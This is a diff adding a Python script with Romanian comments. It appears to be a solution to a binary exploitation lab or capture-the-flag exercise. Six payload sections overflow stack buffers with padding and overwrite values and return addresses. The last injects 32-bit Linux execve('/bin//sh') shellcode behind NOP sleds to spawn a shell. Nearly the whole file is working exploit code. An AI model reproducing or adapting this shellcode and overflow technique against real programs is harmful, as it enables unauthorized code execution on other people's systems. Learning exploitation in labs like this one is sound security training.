@@ -1,0 +1,36 @@
+import sys
+
+# Prima functie
+sys.stdout.buffer.write(bytes([0x41] * 152))
+sys.stdout.buffer.write(bytes([0xD3, 0xDD, 0x43, 0xA1])) # 0x a1 43 dd d3
+sys.stdout.buffer.write(bytes([0x41] * 7))
+
+# A doua functie
+sys.stdout.buffer.write(bytes([0x41] * 31))
+sys.stdout.buffer.write(bytes([0x98, 0x1A, 0xEE, 0x90])) # 0x 90 ee 1a 98
+sys.stdout.buffer.write(bytes([0x41] * 48))
+
+# A treia functie
+sys.stdout.buffer.write(bytes([0x41] * 6))
+sys.stdout.buffer.write(bytes([0x0E, 0x06, 0xC8, 0xC7])) # 0x c7 c8 06 0e
+sys.stdout.buffer.write(bytes([0x41] * 120))
+
+# A patra functie
+sys.stdout.buffer.write(bytes([0x41] * 17))
+sys.stdout.buffer.write(bytes([0xCA, 0xFC, 0x21, 0xB2])) # 0x b2 21 fc ca
+sys.stdout.buffer.write(bytes([0x41] * 72))
+
+# A cincea functie
+sys.stdout.buffer.write(bytes([0x41] * 87))
+sys.stdout.buffer.write(bytes([0x9D, 0x94, 0xF4, 0x2D])) # 0x 2d f4 94 9d
+sys.stdout.buffer.write(bytes([0x41] * 57))
+
+# A sasea functie
+shellcode = bytes([0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x89,0xc1,0x89,0xc2,0xb0,0x0b,0xcd,0x80,0x31,0xc0,0x40,0xcd,0x80])
+
+sys.stdout.buffer.write(bytes([0x41] * 127)) # padding
+sys.stdout.buffer.write(bytes([0xB1, 0x2E, 0x81, 0x50])) # Variabila locala
+sys.stdout.buffer.write(bytes([0x90] * 128)) # sir de NOP-uri
+sys.stdout.buffer.write(shellcode) # shellcode
+sys.stdout.buffer.write(bytes([0x90] * 72)) # sir de NOP-uri
+sys.stdout.buffer.write(bytes([0x74, 0xCF, 0xFF, 0xFF])) # ebp - 100
